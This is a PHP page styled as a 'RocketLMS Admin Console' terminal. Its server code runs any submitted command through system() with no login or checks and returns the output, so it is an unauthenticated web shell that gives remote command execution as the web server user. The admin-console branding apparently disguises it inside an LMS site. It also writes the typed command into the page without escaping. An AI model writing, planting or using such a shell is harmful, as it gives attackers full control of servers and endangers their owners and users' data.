<?php
session_start();
if (!isset($_SESSION['history'])) {
    $_SESSION['history'] = [];
}

if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $_SESSION['history'][] = $cmd;
    ob_start();
    system($cmd . ' 2>&1');
    $output = ob_get_clean();
    echo json_encode(['output' => $output]);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>RocketLMS Admin Console</title>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-color: #0d1117;
            --term-bg: #161b22;
            --text-color: #c9d1d9;
            --accent: #58a6ff;
            --prompt: #3fb950;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-color);
            font-family: 'Fira Code', monospace;
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            height: 100vh;
            box-sizing: border-box;
        }

        #terminal {
            background-color: var(--term-bg);
            border: 1px solid #30363d;
            border-radius: 6px;
            flex-grow: 1;
            overflow-y: auto;
            padding: 15px;
            margin-bottom: 10px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
        }

        .line {
            margin-bottom: 5px;
            white-space: pre-wrap;
        }

        .prompt {
            color: var(--prompt);
            font-weight: bold;
        }

        .cmd {
            color: var(--accent);
        }

        .output {
            color: var(--text-color);
            margin-left: 10px;
            margin-bottom: 10px;
            border-left: 2px solid #30363d;
            padding-left: 10px;
        }

        #input-area {
            display: flex;
            background-color: var(--term-bg);
            border: 1px solid #30363d;
            border-radius: 6px;
            padding: 10px;
        }

        #input-area span {
            color: var(--prompt);
            margin-right: 10px;
            font-weight: bold;
        }

        #cmd-input {
            background: transparent;
            border: none;
            color: var(--accent);
            flex-grow: 1;
            font-family: inherit;
            font-size: 16px;
            outline: none;
        }
    </style>
</head>

<body>
    <h2 style="color: var(--accent); margin-top:0;">🚀 RocketLMS Admin Console <small
            style="color: grey; font-size: 0.5em;">(www-data@<?php echo gethostname(); ?>)</small></h2>
    <div id="terminal">
        <div class="line">Welcome to the Admin Shell. Type 'help' for common commands.</div>
    </div>
    <div id="input-area">
        <span>$</span>
        <input type="text" id="cmd-input" autofocus autocomplete="off">
    </div>

    <script>
        const terminal = document.getElementById('terminal');
        const input = document.getElementById('cmd-input');

        input.addEventListener('keydown', async (e) => {
            if (e.key === 'Enter') {
                const cmd = input.value;
                if (!cmd) return;

                // Add to UI
                const line = document.createElement('div');
                line.className = 'line';
                line.innerHTML = `<span class="prompt">$</span> <span class="cmd">${cmd}</span>`;
                terminal.appendChild(line);
                input.value = '';

                // Send to server
                const res = await fetch('', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: `cmd=${encodeURIComponent(cmd)}`
                });
                const data = await res.json();

                // Add output
                const outDoc = document.createElement('div');
                outDoc.className = 'output';
                outDoc.textContent = data.output || '(no output)';
                terminal.appendChild(outDoc);

                terminal.scrollTop = terminal.scrollHeight;
            }
        });
    </script>
</body>

</html>